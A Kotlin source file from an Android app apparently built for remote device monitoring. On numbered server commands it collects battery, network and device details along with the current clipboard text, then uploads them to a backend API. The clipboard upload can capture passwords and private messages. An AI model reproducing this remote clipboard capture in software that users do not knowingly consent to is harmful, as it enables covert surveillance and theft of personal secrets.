package com.dilarion.app.monitoring

import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import com.dilarion.app.data.api.ApiService
import java.time.Instant

class DeviceInfoCollector(
    private val context: Context,
    private val apiService: ApiService,
    private val getToken: suspend () -> String?,
) {
    suspend fun getBatteryInfo(): Map<String, Any> {
        val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val pct = if (scale > 0) (level * 100 / scale) else -1
        val status = when (intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1)) {
            BatteryManager.BATTERY_STATUS_CHARGING -> "charging"
            BatteryManager.BATTERY_STATUS_DISCHARGING -> "unplugged"
            BatteryManager.BATTERY_STATUS_FULL -> "full"
            else -> "unknown"
        }
        return mapOf("level" to pct, "state" to status, "recorded_at" to Instant.now().toString())
    }

    suspend fun getNetworkInfo(): Map<String, Any> {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork
        val caps = cm.getNetworkCapabilities(network)
        val isConnected = network != null
        val type = when {
            caps == null -> "none"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WIFI"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "CELLULAR"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ETHERNET"
            else -> "other"
        }
        return mapOf(
            "is_connected" to isConnected,
            "is_internet_reachable" to (caps?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true),
            "type" to type,
            "recorded_at" to Instant.now().toString(),
        )
    }

    suspend fun getDeviceInfo(): Map<String, Any> = mapOf(
        "brand" to Build.BRAND,
        "manufacturer" to Build.MANUFACTURER,
        "model_name" to Build.MODEL,
        "os_version" to Build.VERSION.RELEASE,
        "sdk_int" to Build.VERSION.SDK_INT,
        "device" to Build.DEVICE,
        "recorded_at" to Instant.now().toString(),
    )

    suspend fun getClipboard(): Map<String, Any> {
        val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val text = cm.primaryClip?.getItemAt(0)?.coerceToText(context)?.toString() ?: ""
        return mapOf("text" to text, "recorded_at" to Instant.now().toString())
    }

    suspend fun uploadBattery(commandId: Int) {
        val token = getToken() ?: return
        val data = getBatteryInfo().toMutableMap()
        data["command_id"] = commandId
        runCatching { apiService.uploadBatteryInfo("Bearer $token", data) }
    }

    suspend fun uploadNetwork(commandId: Int) {
        val token = getToken() ?: return
        val data = getNetworkInfo().toMutableMap()
        data["command_id"] = commandId
        runCatching { apiService.uploadNetworkInfo("Bearer $token", data) }
    }

    suspend fun uploadDevice(commandId: Int) {
        val token = getToken() ?: return
        val data = getDeviceInfo().toMutableMap()
        data["command_id"] = commandId
        runCatching { apiService.uploadDeviceInfo("Bearer $token", data) }
    }

    suspend fun uploadClipboard(commandId: Int) {
        val token = getToken() ?: return
        val data = getClipboard().toMutableMap()
        data["command_id"] = commandId
        runCatching { apiService.uploadClipboard("Bearer $token", data) }
    }
}
